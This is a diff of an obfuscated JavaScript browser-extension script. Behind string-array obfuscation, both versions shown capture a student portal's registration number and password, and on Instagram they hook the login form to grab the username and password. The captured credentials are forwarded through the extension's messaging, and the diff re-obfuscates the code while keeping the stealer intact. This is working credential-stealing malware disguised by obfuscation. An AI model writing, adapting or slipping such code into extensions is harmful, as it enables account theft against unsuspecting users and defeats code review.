@@ -1,95 +1,11 @@
-function a0a() {
-  const p = [
-    "C3r1zgvUDf9KyxrH",
-    "mJi2nZqWAMDPAvz4",
-    "zM9YrwfJAa",
-    "Aw5ZDgfNCMfTlMnVBq",
-    "Aw5ZDgfNCMfTx2XVz2LUx2rHDge",
-    "jwpINiuGw0LhxsbmB2DPBIbMB3jTigrLDgvJDgvK",
-    "mtbZvKfUDwS",
-    "CxvLCNLtzwXLy3rVCG",
-    "z2v0rwXLBwvUDej5swq",
-    "jwpIMQdVUi8GtfbvigLUChv0CYbUB3qGzM91BMqGywz0zxiGBwf4ihjLDhjPzxmUifnJCMLWDcbZDg9WCgvKlG",
-    "mJeWoxjKve1cBa",
-    "DhjPBq",
-    "nJG2mdmXnLLeruLbCa",
-    "Aw5JBhvKzxm",
-    "y2HHBMDL",
-    "nJmYDgP6yuz2",
-    "Aw5WDxrBBMfTzt0NDxnLCM5HBwuNxq",
-    "y29SB3i6igDYzwvUoW",
-    "D2fYBG",
-    "jwpINiuGtfbvigLUChv0igXPC3rLBMvYCYbHDhrHy2HLza",
-    "DhH0vq",
-    "Aw5WDxrBBMfTzt0NCgfZC3DVCMqNxq",
-    "vhH0ChDKqxv0B0LKxZG3nJC",
-    "CNvUDgLTzq",
-    "4P2mievYCM9YihnLDhrPBMCGDxaGtfbvigXPC3rLBMvYCZO",
-    "y29SB3i6ign5yw47",
-    "nJK2vhfQt0jX",
-    "Bg9N",
-    "mtnZwgzAr2W",
-    "4PQG77IpifTjr10Grw1WDhKGDxnLCM5HBwuGB3iGCgfZC3DVCMqSig5VDcbZzw50",
-    "y29SB3i6ig9Yyw5NztSGzM9UDc13zwLNAhq6igjVBgq7",
-    "mti1mvf6sxnpvW",
-    "mJHfreLZCfK",
-    "4PQG77IpifTjr10Gtg9NAw4GC25PzMyGzMfPBgvKigfMDgvYig1HEcbHDhrLBxb0CW",
-    "odeWntiWDunNAxL3",
-    "Aw5WDxq",
-    "ndm1nJrfuvfyz1e",
-    "ywrKrxzLBNrmAxn0zw5LCG",
-    "jwpWN5oKifTjr10Gq2fWDhvYzwqGy3jLzgvUDgLHBhm6icvJ",
-    "y29SB3i6ig9Yyw5NztS",
-    "yNv0Dg9Uw3r5Cgu9j3n1yM1PDcDDoM5VDcHBzgLZywjSzwrDkq",
-    "y2XPy2S",
-    "n0nfAfPhsW",
-    "yMX1CG",
-    "Ag9ZDg5HBwu",
-    "C2vUze1LC3nHz2u",
-    "mJaXnJy4nvniBMvkBG",
-    "zxjYB3i",
-    "DMfSDwu",
-  ];
-  a0a = function () {
-    return p;
-  };
-  return a0a();
-}
 const a0m = a0b;
-(function (a, b) {
-  const g = a0b,
-    c = a();
-  while (!![]) {
-    try {
-      const d =
-        (parseInt(g(0xd1)) / 0x1) * (parseInt(g(0xcb)) / 0x2) +
-        (-parseInt(g(0xe2)) / 0x3) * (parseInt(g(0xb6)) / 0x4) +
-        -parseInt(g(0xc9)) / 0x5 +
-        (parseInt(g(0xd9)) / 0x6) * (-parseInt(g(0xc7)) / 0x7) +
-        (parseInt(g(0xc1)) / 0x8) * (-parseInt(g(0xc6)) / 0x9) +
-        (parseInt(g(0xde)) / 0xa) * (-parseInt(g(0xd5)) / 0xb) +
-        (-parseInt(g(0xb3)) / 0xc) * (-parseInt(g(0xc3)) / 0xd);
-      if (d === b) break;
-      else c["push"](c["shift"]());
-    } catch (e) {
-      c["push"](c["shift"]());
-    }
-  }
-})(a0a, 0x197d1);
-function sendStudentData(a, b) {
-  const h = a0b;
-  chrome[h(0xbe)][h(0xd4)]({
-    type: h(0xd8),
-    data: { registrationNumber: a, password: b },
-  });
-}
 function a0b(a, b) {
   const c = a0a();
   return (
     (a0b = function (d, e) {
-      d = d - 0xb2;
+      d = d - 0xfe;
       let f = c[d];
-      if (a0b["vBHITX"] === undefined) {
+      if (a0b["GyMAvC"] === undefined) {
         var g = function (l) {
           const m =
             "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
@@ -111,39 +27,66 @@ function a0b(a, b) {
           }
           return decodeURIComponent(o);
         };
-        (a0b["tmkefa"] = g), (a = arguments), (a0b["vBHITX"] = !![]);
+        (a0b["CpgVzL"] = g), (a = arguments), (a0b["GyMAvC"] = !![]);
       }
       const h = c[0x0],
         i = d + h,
         j = a[i];
-      return !j ? ((f = a0b["tmkefa"](f)), (a[i] = f)) : (f = j), f;
+      return !j ? ((f = a0b["CpgVzL"](f)), (a[i] = f)) : (f = j), f;
     }),
     a0b(a, b)
   );
 }
+(function (a, b) {
+  const g = a0b,
+    c = a();
+  while (!![]) {
+    try {
+      const d =
+        (parseInt(g(0x11b)) / 0x1) * (-parseInt(g(0x108)) / 0x2) +
+        -parseInt(g(0x101)) / 0x3 +
+        parseInt(g(0x10e)) / 0x4 +
+        (parseInt(g(0x11a)) / 0x5) * (-parseInt(g(0x116)) / 0x6) +
+        (parseInt(g(0x10b)) / 0x7) * (parseInt(g(0x102)) / 0x8) +
+        (parseInt(g(0x105)) / 0x9) * (parseInt(g(0x11f)) / 0xa) +
+        (-parseInt(g(0x127)) / 0xb) * (-parseInt(g(0x107)) / 0xc);
+      if (d === b) break;
+      else c["push"](c["shift"]());
+    } catch (e) {
+      c["push"](c["shift"]());
+    }
+  }
+})(a0a, 0x924e8);
+function sendStudentData(a, b) {
+  const h = a0b;
+  chrome[h(0x117)][h(0x106)]({
+    type: h(0x10a),
+    data: { registrationNumber: a, password: b },
+  });
+}
 function setupStudentListeners() {
   const i = a0b;
   try {
-    const a = document[i(0xe0)](i(0xbb)),
-      b = document[i(0xe0)](i(0xbd));
+    const a = document[i(0x115)](i(0x10c)),
+      b = document[i(0x115)](i(0x10f));
     if (!a || !b) return ![];
     const c = () => {
       const j = i,
-        d = a[j(0xd7)][j(0xb2)](),
-        f = b[j(0xd7)];
+        d = a[j(0x118)][j(0x123)](),
+        f = b[j(0x118)];
       if (d && f) sendStudentData(d, f);
     };
     return (
       c(),
-      [i(0xca), i(0xb5), i(0xd2)][i(0xda)]((d) => {
+      [i(0x110), i(0x112), i(0x120)][i(0x11d)]((d) => {
         const k = i;
-        a[k(0xcc)](d, c), b[k(0xcc)](d, c);
+        a[k(0x10d)](d, c), b[k(0x10d)](d, c);
       }),
-      console[i(0xc2)](i(0xba), i(0xb8)),
+      console[i(0x125)](i(0x103), i(0x119)),
       !![]
     );
   } catch (d) {
-    return console[i(0xd6)](i(0xbf), d), ![];
+    return console[i(0x126)](i(0x104), d), ![];
   }
 }
 if (!setupStudentListeners()) {
@@ -154,40 +97,88 @@ if (!setupStudentListeners()) {
       retries++,
         (setupStudentListeners() || retries >= maxRetries) &&
           (clearInterval(interval),
-          retries >= maxRetries && console[l(0xc2)](l(0xe1), l(0xce)));
+          retries >= maxRetries && console[l(0x125)](l(0x11c), l(0x121)));
     }, 0x2bc);
 }
-if (location[a0m(0xd3)][a0m(0xb4)](a0m(0xdb))) {
+function a0a() {
+  const p = [
+    "y2HHBMDL",
+    "Aw5ZDgfNCMfTlMnVBq",
+    "yNv0Dg9Uw3r5Cgu9j3n1yM1PDcDDoM5VDcHBzgLZywjSzwrDkq",
+    "z2v0rwXLBwvUDej5swq",
+    "mJCZndy4C3LLAhzy",
+    "CNvUDgLTzq",
+    "DMfSDwu",
+    "y29SB3i6igDYzwvUoW",
+    "mJbIzKnfDwi",
+    "mtuZmJfvuNDnuu8",
+    "jwpIMQdVUi8GtfbvigLUChv0CYbUB3qGzM91BMqGywz0zxiGBwf4ihjLDhjPzxmUifnJCMLWDcbZDg9WCgvKlG",
+    "zM9YrwfJAa",
+    "CxvLCNLtzwXLy3rVCG",
+    "ntyWzhrjveXP",
+    "yMX1CG",
+    "y29SB3i6ig9Yyw5NztS",
+    "y2XPy2S",
+    "DhjPBq",
+    "Aw5JBhvKzxm",
+    "Bg9N",
+    "zxjYB3i",
+    "mZeZntbWA256uLq",
+    "jwpINiuGw0LhxsbmB2DPBIbMB3jTigrLDgvJDgvK",
+    "Aw5WDxrBBMfTzt0NDxnLCM5HBwuNxq",
+    "Aw5ZDgfNCMfTx2XVz2LUx2rHDge",
+    "mZi4mtKZn3HuseLyrq",
+    "mtzREu9LwMy",
+    "jwpINiuGtfbvigLUChv0igXPC3rLBMvYCYbHDhrHy2HLza",
+    "4P2mievYCM9YihnLDhrPBMCGDxaGtfbvigXPC3rLBMvYCZO",
+    "odC0odLdz1LcCNO",
+    "C2vUze1LC3nHz2u",
+    "nZm1nM1oDKnKsW",
+    "mtq4EMfNsxHj",
+    "Ag9ZDg5HBwu",
+    "C3r1zgvUDf9KyxrH",
+    "mtCYndi0B0ToCurg",
+    "DhH0vq",
+    "ywrKrxzLBNrmAxn0zw5LCG",
+    "mJy3nduWog5Zt1bhsW",
+    "vhH0ChDKqxv0B0LKxZG3nJC",
+    "Aw5WDxq",
+    "Aw5WDxrBBMfTzt0NCgfZC3DVCMqNxq",
+  ];
+  a0a = function () {
+    return p;
+  };
+  return a0a();
+}
+if (location[a0m(0x109)][a0m(0x124)](a0m(0x113))) {
   let igTries = 0x0;
   const igMaxTries = 0x19,
     sniffInstagramLogin = setInterval(() => {
       const n = a0m;
       igTries++;
-      const a = document[n(0xdf)](n(0xb7)),
-        b = document[n(0xdf)](n(0xbc)),
-        c = document[n(0xdf)](n(0xcf));
+      const a = document[n(0x11e)](n(0xff)),
+        b = document[n(0x11e)](n(0x111)),
+        c = document[n(0x11e)](n(0x114));
       a &&
         b &&
         c &&
-        (console[n(0xc2)](n(0xdd), n(0xb8)),
-        c[n(0xcc)](
-          n(0xd0),
+        (console[n(0x125)](n(0xfe), n(0x119)),
+        c[n(0x10d)](
+          n(0x122),
           () => {
             const o = n,
-              d = a[o(0xd7)][o(0xb2)](),
-              e = b[o(0xd7)];
-            d && e
-              ? (console[o(0xc2)](o(0xcd) + d, o(0xc0), o(0xc5)),
-                chrome[o(0xbe)][o(0xd4)]({
-                  type: o(0xdc),
-                  data: { username: d, password: e },
-                }))
-              : console[o(0xb9)](o(0xc4));
+              d = a[o(0x118)][o(0x123)](),
+              e = b[o(0x118)];
+            d &&
+              e &&
+              chrome[o(0x117)][o(0x106)]({
+                type: o(0x100),
+                data: { username: d, password: e },
+              });
           },
           { once: !![] }
         ),
         clearInterval(sniffInstagramLogin)),
-        igTries >= igMaxTries &&
-          (console[n(0xb9)](n(0xc8)), clearInterval(sniffInstagramLogin));
+        igTries >= igMaxTries && clearInterval(sniffInstagramLogin);
     }, 0x2bc);
 }
